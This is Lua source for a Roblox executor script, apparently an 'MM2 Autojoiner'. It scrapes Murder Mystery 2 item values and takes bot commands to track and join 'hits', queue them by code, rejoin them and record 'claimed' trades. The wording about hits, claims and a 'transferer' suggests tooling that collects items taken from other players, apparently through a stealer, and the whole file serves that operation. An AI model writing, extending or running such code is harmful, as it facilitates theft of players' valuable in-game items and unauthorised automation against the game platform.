-- ═══════════════════════════════════════════════════════════════════════
-- MM2VALUES SCRAPER  (shared by !inv and the background preload)
-- ═══════════════════════════════════════════════════════════════════════
local VALUE_PAGES = {
    { url = "https://www.mm2values.com/?p=godly",    chroma = false },
    { url = "https://www.mm2values.com/?p=ancient",  chroma = false },
    { url = "https://www.mm2values.com/?p=unique",   chroma = false },
    { url = "https://www.mm2values.com/?p=vintage",  chroma = false },
    { url = "https://www.mm2values.com/?p=chroma",   chroma = true  },
}
local VALUE_TTL = 1800

-- Returns the cache table {allV, chrV, ts}, scraping only if stale.
local function getValueCache(force)
    local c = getgenv()._aj_mmValCache
    if not force and c and (os.time() - (c.ts or 0)) < VALUE_TTL then return c end

    local allV, chrV = {}, {}
    local done = 0
    for _, pg in ipairs(VALUE_PAGES) do
        task.spawn(function()
            pcall(function()
                local ok, res = pcall(request, { Url = pg.url, Method = "GET", Headers = { ["User-Agent"] = "Mozilla/5.0" } })
                if not ok or not res then return end
                local body = res.Body or ""
                if pg.chroma then
                    for name, raw in body:gmatch("class='chroma%-text'>([^<]+)</div></b> Value: ([%d,]+)") do
                        local val = tonumber((raw:gsub(",", "")))
                        if val then chrV[nrm(name:gsub("^[Cc]hroma ", ""))] = val end
                    end
                else
                    for name, raw in body:gmatch("<b>([^<]+)</b><br> Value: ([%d,]+)") do
                        local val = tonumber((raw:gsub(",", "")))
                        if val then allV[nrm(name)] = val end
                    end
                end
            end)
            done = done + 1
        end)
    end
    local polls = 0
    while done < #VALUE_PAGES and polls < 100 do task.wait(0.2); polls = polls + 1 end

    if next(allV) then
        getgenv()._aj_mmValCache = { allV = allV, chrV = chrV, ts = os.time() }
    elseif not getgenv()._aj_mmValCache then
        -- Scrape failed and we have nothing — cache empties briefly so a retry
        -- happens on the next call instead of hammering five pages per lookup.
        getgenv()._aj_mmValCache = { allV = {}, chrV = {}, ts = os.time() - VALUE_TTL + 60 }
    end
    return getgenv()._aj_mmValCache
end

local destroyNoRender, buildNoRender  -- forward-declared; defined after WindUI section
local paused = false                  -- forward-declared: handleCommand reads it,
                                      -- and it used to resolve to a nil global here,
                                      -- so !status never reported the paused state.

local function handleCommand(cmd, senderName, args)
    logMsg("CMD !" .. cmd .. " from " .. senderName)
    if cmd == "status" then
        local ch     = getgenv()._aj_currentHit
        local qLen   = #hitQueue
        local action = getgenv()._aj_lastAction
        local weapon = getgenv()._aj_lastWeapon
        local claims = getgenv()._aj_sessionClaims or 0
        local sessVal= getgenv()._aj_sessionVal or 0

        local function agoStr(ts)
            if not ts or ts == 0 then return "—" end
            local d = os.time() - ts
            if d < 60 then return d .. "s ago"
            elseif d < 3600 then return math.floor(d/60) .. "m " .. (d%60) .. "s ago"
            else return math.floor(d/3600) .. "h " .. math.floor(d/60)%60 .. "m ago" end
        end

        if ch then
            local elapsed = os.time() - (getgenv()._aj_inServerSince or os.time())
            local m, s   = math.floor(elapsed / 60), elapsed % 60
            local timeStr = m .. "m " .. s .. "s"

            local lastWeaponLine = "—"
            if weapon then
                lastWeaponLine = weapon.name .. " x" .. weapon.amount
                    .. " (" .. commaNum(weapon.value) .. " val) · " .. agoStr(weapon.ts)
            end

            sendBotEmbed({
                color  = 0x2ECC71,
                title  = "🟢 Active — " .. ch.playerName,
                fields = {
                    { name = "💰 Hit Value",     value = commaNum(ch.value), inline = true },
                    { name = "⏱️ Time in Server", value = timeStr,           inline = true },
                    { name = "📋 Queue",          value = tostring(qLen),     inline = true },
                    { name = "🏆 Session Claims", value = claims .. " trades · +" .. commaNum(sessVal) .. " val", inline = false },
                    { name = "🗡️ Last Weapon",    value = lastWeaponLine,                                         inline = false },
                    { name = "📌 Last Action",    value = action and (action.msg .. " · " .. agoStr(action.ts)) or "—", inline = false },
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
            })
        else
            local lastWeaponLine = "—"
            if weapon then
                lastWeaponLine = weapon.name .. " x" .. weapon.amount
                    .. " (" .. commaNum(weapon.value) .. " val) · " .. agoStr(weapon.ts)
            end
            sendBotEmbed({
                color  = paused and 0xE67E22 or 0x95A5A6,
                title  = paused and "⏸ Paused" or "⏳ Idle",
                fields = {
                    { name = "📋 Queue",          value = tostring(qLen),  inline = true },
                    { name = "🏆 Session Claims", value = claims .. " trades · +" .. commaNum(sessVal) .. " val", inline = true },
                    { name = "🗡️ Last Weapon",    value = lastWeaponLine,  inline = false },
                    { name = "📌 Last Action",    value = action and (action.msg .. " · " .. agoStr(action.ts)) or "—", inline = false },
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
            })
        end
    elseif cmd == "inv" then
        task.spawn(function()
            pcall(function()
                local cache = getValueCache()
                local allV, chrV = cache.allV, cache.chrV

                local inv = game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(LP.Name)
                local db  = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))

                local VINTAGE_PLUS = { Classic = true, Godly = true, Ancient = true, Unique = true }
                local items, grandTotal = {}, 0

                for id, cnt in pairs(inv['Weapons']['Owned'] or {}) do
                    if (cnt or 0) > 0 then
                        local d = db[id]
                        if d and VINTAGE_PLUS[d.Rarity or ""] then
                            local isChroma = id:find("Chroma", 1, true) ~= nil
                            local key = nrm(d.ItemName or "")
                            local val = 0
                            if isChroma then
                                val = chrV[key] or 0
                            else
                                val = allV[key] or 0
                                if val == 0 then
                                    for k, v in pairs(allV) do
                                        if k:find(key, 1, true) then val = v; break end
                                    end
                                end
                            end
                            local sub = val * cnt
                            grandTotal = grandTotal + sub
                            table.insert(items, { name = d.ItemName, cnt = cnt, val = val, sub = sub })
                        end
                    end
                end

                table.sort(items, function(a, b) return a.sub > b.sub end)

                if #items == 0 then
                    sendBotMsg("📦 No Vintage+ items found")
                    return
                end

                local MAX_SHOW = 25
                local lines = {}
                for i, it in ipairs(items) do
                    if i > MAX_SHOW then break end
                    local label = it.cnt > 1 and (it.name .. " x" .. it.cnt) or it.name
                    local valStr = it.val > 0 and commaNum(it.sub) or "?"
                    table.insert(lines, string.format("%-22s %s", label, valStr))
                end
                if #items > MAX_SHOW then
                    table.insert(lines, "  ... and " .. (#items - MAX_SHOW) .. " more")
                end
                table.insert(lines, string.rep("\xe2\x94\x80", 28))
                table.insert(lines, string.format("%-22s %s", "Total", commaNum(grandTotal)))

                sendBotEmbed({
                    title       = "📦  My Inventory  —  " .. commaNum(grandTotal) .. " value",
                    description = "```\n" .. table.concat(lines, "\n") .. "\n```",
                    color       = 5763719,
                    footer      = { text = #items .. " items  •  mm2values.com" },
                })
            end)
        end)
    elseif cmd == "rejoin" or cmd == "retry" then
        -- Both mean the same thing: put me back on the hit I am on, or the last
        -- one I was on. !retry used to only ever look at _aj_lastFailedHit — the
        -- hit you had just been kicked out of / left was unreachable by either
        -- command. Live-check is advisory here: an explicit command forces it.
        local h = getgenv()._aj_currentHit
                  or getgenv()._aj_lastHit
                  or getgenv()._aj_lastFailedHit
        if not h then
            sendBotMsg("❌ No hit to " .. cmd .. " — nothing joined this session")
        elseif tostring(game.JobId) == h.jobId then
            sendBotMsg("ℹ️ Already in **" .. h.playerName .. "**'s server")
        else
            visited[h.jobId] = nil
            getgenv()._aj_done       = false
            getgenv()._aj_doneReason = ""
            local live = isHitStillLive(h)
            sendBotMsg((live and "🔄 Rejoining **" or "⚠️ Embed says dead — forcing **")
                .. h.playerName .. "** (" .. commaNum(h.value) .. " value)...")
            logMsg("!" .. cmd .. " → " .. h.playerName .. (live and "" or " (forced)"))
            joinServer(h)
        end
    elseif cmd == "serverhop" then
        sendBotMsg("🔀 Server hopping...")
        logMsg("Server hopping via !serverhop")
        task.spawn(doServerHop)
    elseif cmd == "lastclaim" then
        local info = getgenv()._aj_lastClaimInfo
        local t    = getgenv()._aj_lastClaimTime or 0
        if info and t > 0 then
            local ago = os.time() - t
            local agoStr = ago < 60 and (ago .. "s ago") or (math.floor(ago/60) .. "m " .. (ago%60) .. "s ago")
            local lines = {}
            for _, it in ipairs(info.items or {}) do
                table.insert(lines, it.name .. " x" .. it.amount .. "  (" .. commaNum(it.value) .. " val)")
            end
            local desc = #lines > 0 and table.concat(lines, "\n") or "No item diff recorded"
            sendBotEmbed({
                color       = 0x2ECC71,
                title       = "🕑 Last Claim — " .. agoStr,
                description = "```\n" .. desc .. "\n```",
                fields      = {
                    { name = "From",  value = info.playerName,              inline = true },
                    { name = "Value", value = commaNum(info.totalVal or 0), inline = true },
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
            })
        else
            sendBotMsg("❌ No claim recorded this session")
        end
    elseif cmd == "join" then
        local code = (args or ""):upper():gsub("%s+", "")
        if code == "" then
            sendBotMsg("❌ Usage: `!join CODE`  (e.g. `!join A3F2B1`)")
        else
            local h = (getgenv()._aj_hitHistory or {})[code]
            if h then
                visited[h.jobId] = nil
                sendBotMsg("🔄 Joining **" .. h.playerName .. "** `[" .. code .. "]` — " .. commaNum(h.value) .. " value...")
                logMsg("!join " .. code .. " → " .. h.playerName)
                joinServer(h)
            else
                sendBotMsg("❌ Code `" .. code .. "` not found — only hits seen this session are stored")
            end
        end
    elseif cmd == "norender" then
        if getgenv()._aj_norender then
            destroyNoRender()
            sendBotMsg("🖥️ No-render mode **OFF** — rendering restored")
        else
            buildNoRender()
            sendBotMsg("⬛ No-render mode **ON** — black screen + stats active")
        end
    elseif cmd == "pause" then
        paused = true
        sendBotMsg("⏸ Paused — no new hits will be joined")
    elseif cmd == "resume" or cmd == "unpause" then
        paused = false
        sendBotMsg("▶️ Resumed")
    elseif cmd == "skip" then
        if getgenv()._aj_currentHit then
            getgenv()._aj_done       = true
            getgenv()._aj_doneReason = "Skipped via command"
            sendBotMsg("⏭️ Skipping **" .. getgenv()._aj_currentHit.playerName .. "**")
        else
            sendBotMsg("❌ No active hit to skip")
        end
    elseif cmd == "queue" then
        if #hitQueue == 0 then
            sendBotMsg("📋 Queue empty")
        else
            local lines = {}
            for i, h in ipairs(hitQueue) do
                if i > 10 then break end
                table.insert(lines, string.format("%d. %-18s %s  [%s]", i, h.playerName, commaNum(h.value), h.code or "?"))
            end
            if #hitQueue > 10 then table.insert(lines, "... and " .. (#hitQueue - 10) .. " more") end
            sendBotEmbed({
                color       = 0x3498DB,
                title       = "📋 Queue — " .. #hitQueue .. " hits",
                description = "```\n" .. table.concat(lines, "\n") .. "\n```",
            })
        end
    elseif cmd == "help" then
        sendBotEmbed({
            color = 0x2ECC71,
            title = "📋 MM2 Autojoiner — Commands",
            description = table.concat({
                "**!status** — current target, value, time in server, queue size",
                "**!queue** — list queued hits with their join codes",
                "**!inv** — your MM2 inventory (Godly+) with values",
                "**!join CODE** — join a specific hit by code (shown in transferer embed as 🔑 `XXXXXX`)",
                "**!rejoin** / **!retry** — teleport back to the current hit (or the last one you were on)",
                "**!serverhop** — leave and join a random MM2 server",
                "**!skip** — abandon the current hit and move to the next",
                "**!pause** / **!resume** — stop or restart joining new hits",
                "**!lastclaim** — info about the last successfully claimed trade",
                "**!norender** — toggle black-screen no-render mode (stats overlay)",
                "**!help** — this message",
            }, "\n"),
            timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
        })
    end
end

